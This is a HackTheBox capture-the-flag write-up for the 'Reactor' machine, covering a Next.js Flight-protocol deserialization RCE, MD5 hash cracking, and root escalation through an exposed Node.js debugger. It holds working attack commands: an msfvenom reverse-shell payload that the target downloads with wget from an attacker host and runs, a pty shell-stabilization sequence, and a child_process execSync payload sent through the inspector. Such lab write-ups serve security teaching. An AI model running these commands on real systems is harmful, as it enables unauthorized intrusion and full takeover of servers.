# Reactor — HackTheBox Writeup

> **Difficulty:** Easy  
> **OS:** Linux (Ubuntu 24)  
> **Category:** Web, Privilege Escalation  
> **CVEs Involved:** CVE-2025-55182

---

## Overview

The **Reactor** machine hosts a web application built using the **Next.js** framework (version **15.0.3**). This specific version is vulnerable to a critical pre-authentication Remote Code Execution (RCE) flaw:
- **CVE-2025-55182** — React Flight Protocol Insecure Deserialization RCE.

Initial access is gained by exploiting this vulnerability to execute commands and establish a reverse shell as the `node` user. Following that, local enumeration of the SQLite database `reactor.db` yields the MD5 password hash for the user `engineer`. Once the hash is cracked, we can log in via SSH to read the user flag.

Privilege escalation to root is achieved by exploiting a Node.js process running as root with the `--inspect` flag enabled on port `9229`. By connecting to this local debugger, we can execute arbitrary JavaScript code to gain full administrative control of the system.

---

## Phase 1 — Enumeration

During initial reconnaissance, inspecting the HTTP headers of the web server reveals the use of Next.js:

```bash
curl -I http://reactor.htb
# X-Powered-By: Next.js
```

By analyzing the client-side JavaScript bundles, we can pinpoint the exact version in use: **Next.js 15.0.3**.

---

## Phase 2 — CVE-2025-55182: React Flight Protocol Deserialization RCE

### Vulnerability Details

| Field | Detail |
|-------|--------|
| **CVE** | CVE-2025-55182 (React2Shell) |
| **Type** | Insecure Deserialization |
| **Authentication** | Not Required (Pre-Authentication) |
| **CVSS v3.1** | 10.0 (Critical) |

**Root Cause:** The vulnerability resides in the `react-server-dom` library (used by Next.js and other frameworks to implement React Server Components - RSC). The "Flight" protocol is used to serialize and transmit data structures, such as component trees and Server Function calls, between the client and server. During server-side deserialization of these streams, vulnerable packages fail to properly validate the structure of the incoming data.

**Exploitation Mechanism:** An attacker can send a crafted HTTP POST request containing a fake serialized "Chunk" object. By defining a custom `then` property inside the serialized object, the attacker forces the React parser to treat the object as a Promise. When the server attempts to resolve this Promise, it executes the injected `then` method, allowing the attacker to hijack the internal parser state (the `_response` object) and run arbitrary JavaScript code inside the server's Node.js runtime.

### Exploitation

To obtain command execution, the public exploit script is executed against the target:

```bash
python3 exploit.py exec -t http://reactor.htb -c "id"
# uid=1000(node) gid=1000(node)
```

The output of the `id` command confirms initial code execution under the unprivileged `node` user account.

---

## Phase 3 — Reverse Shell and Stabilization

To get an interactive shell, we generate a Linux ELF payload using `msfvenom` on the attacker's machine:

```bash
# On the attacker's Kali machine
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.162 LPORT=4444 -f elf -o shell.elf

# Start a temporary web server to host the payload
python3 -m http.server 8000

# Start Netcat listener
nc -lvnp 4444
```

Using the Next.js RCE, we download and execute the payload on the target server:

```bash
python3 exploit.py exec -t http://reactor.htb -c "wget http://10.10.14.162:8000/shell.elf -O /tmp/shell.elf"
python3 exploit.py exec -t http://reactor.htb -c "chmod +x /tmp/shell.elf"
python3 exploit.py exec -t http://reactor.htb -c "/tmp/shell.elf"
```

Once the connection is received on our listener, we stabilize the shell to obtain a fully interactive TTY:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Press Ctrl+Z to background the shell
stty raw -echo; fg
```

---

## Phase 4 — Local Enumeration and Credential Extraction

### Exploring the SQLite Database

During local enumeration, we find an SQLite database file named `reactor.db`. Using the `sqlite3` client, we query the users table:

```bash
sqlite3 reactor.db "SELECT * FROM users"
# engineer | 39d97110************************
```

> ⚠️ The MD5 password hash for the user `engineer` is successfully retrieved: `39d97110************************`.

### Cracking the Hash with Hashcat

We crack the MD5 hash (mode `-m 0` in Hashcat) using the `rockyou.txt` wordlist:

```bash
hashcat -m 0 engineer.hash /usr/share/wordlists/rockyou.txt
# Password found: rea******
```

The plaintext password for `engineer` is `rea******`.

---

## 🚩 User Flag

Using the retrieved credentials, we log in via SSH to read the user flag:

```bash
ssh engineer@10.129.1.246
# Enter password: rea******

engineer@reactor:~$ cat user.txt
3a087***************************
```

---

## Phase 5 — Privilege Escalation to Root (Node.js Inspector)

### Active Process Analysis

Checking the processes running with root privileges reveals an interesting configuration:

```bash
ps aux | grep root
# /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

A Node.js process (`worker.js`) is running as **root** with the `--inspect=127.0.0.1:9229` argument.

### Attack Vector Details

The `--inspect` flag activates Node.js's built-in V8 Inspector, which exposes a WebSocket-based debugging interface.

* **Why is it vulnerable?** By default, the Node.js debugger requires no authentication. Anyone who can connect to the debug port (`9229`) gains access to an interactive JavaScript REPL running in the context of the parent process. Since `worker.js` is running as root, interacting with the debugger allows us to execute system commands with root privileges.
* **Network Restrictions:** The debugger is bound to `127.0.0.1` (localhost), which prevents direct external connections. However, since we have local shell access as `engineer`, we can connect directly to the local port `9229`.

### Exploiting the Debugger

First, we query the `/json` HTTP endpoint exposed by Node.js to get the debugger websocket URL:

```bash
curl -s http://127.0.0.1:9229/json
# webSocketDebuggerUrl: ws://127.0.0.1:9229/1eccde22-...
```

To connect to and interact with the debugger, we use the native Node.js inspector client:

```bash
node inspect 127.0.0.1:9229
```

Once connected (indicated by the `debug>` prompt), we can execute JavaScript in the context of the root process using the `exec()` command:

```jsx
exec("process.mainModule.constructor._load('child_process').execSync('cat /root/root.txt').toString()")
# Result: 'cf7cb***************************\n'
```

#### Payload Breakdown:
1. `process.mainModule`: References the main entry module that started the Node.js application.
2. `constructor._load()`: An internal module-loader method in Node.js. It is preferred here over `require()` because `require()` might not be directly exposed or might be restricted within the global context of the debugger.
3. `child_process`: The built-in Node.js module used to spawn subprocesses in the operating system.
4. `execSync(...)`: Synchronously executes a system command in the underlying shell.
5. `.toString()`: Converts the raw binary buffer returned by the command execution into a readable string.

---

## 🚩 Root Flag

Executing the command through the privileged process returns the contents of `root.txt`:

```
cf7cb***************************
```

---

## Attack Summary

```
[Port Scan & Enumeration]
        ↓
[Identify Next.js 15.0.3]
        ↓
[CVE-2025-55182: Flight Protocol Deserialization RCE]
        ↓
[Initial Code Execution as node user]
        ↓
[Reverse Shell & Stabilization]
        ↓
[Extract MD5 hash for engineer from SQLite DB reactor.db]
        ↓
[Crack hash via Hashcat (rockyou) -> password rea******]
        ↓
[SSH login as engineer -> User Flag]
        ↓
[Identify Node.js Inspector running as root (port 9229)]
        ↓
[Exploit Node Debugger -> RCE via child_process as root]
        ↓
[Execute command to read root.txt -> Root Flag]
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `curl` | Initial HTTP header enumeration and debugger verification |
| `exploit.py` (CVE-2025-55182) | Initial RCE via Next.js insecure deserialization |
| `msfvenom` | Reverse shell ELF payload generation |
| `sqlite3` | Querying the local database `reactor.db` |
| `hashcat` | Cracking the MD5 hash for `engineer` |
| `node inspect` | Connecting to the local Node.js debugger for privilege escalation |

---

## Lessons Learned

- **Dependency and Framework Patching:** Vulnerabilities in modern frameworks (like those related to React Server Components/Flight Protocol) can expose the entire application to pre-authentication RCE. Regularly auditing and applying security patches to web frameworks is essential.
- **Production Inspection and Debugging:** Flags like `--inspect` or `--inspect-brk` should never be enabled in production environments, especially for services running with elevated (root) privileges. If debugging is necessary, access should be strictly controlled via encrypted SSH tunnels or VPNs and disabled immediately after use.
